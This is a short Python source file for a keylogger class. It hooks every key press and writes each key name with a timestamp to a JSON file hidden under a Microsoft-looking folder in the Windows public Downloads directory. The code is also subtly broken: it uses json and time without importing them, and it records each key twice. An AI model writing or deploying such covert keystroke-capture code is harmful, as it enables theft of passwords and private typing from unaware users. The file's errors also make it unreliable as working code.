import keyboard
import config
from pathlib import Path

class Logger:

    def __init__(self):

        self.save_path = Path(f"C:/Users/Public/Downloads/Microsoft/Logger/kl.lg")

    def save(self, button):

        data = {}
        with open(self.save_path, "r") as file:
            data = json.load(file)

        data[f"{time.time()}"] = button
        with open(self.save_path, "w") as file:
            json.dump(data, file)


    def on_key(self, event):

        button = str(event.name)
        self.save(button)
        self.save(button)

    async def listen(self):
        keyboard.on_press(self.on_key)
        keyboard.wait()

    def clear_data(self):

        with open(self.save_path, "w") as file:
            json.dump({}, file)
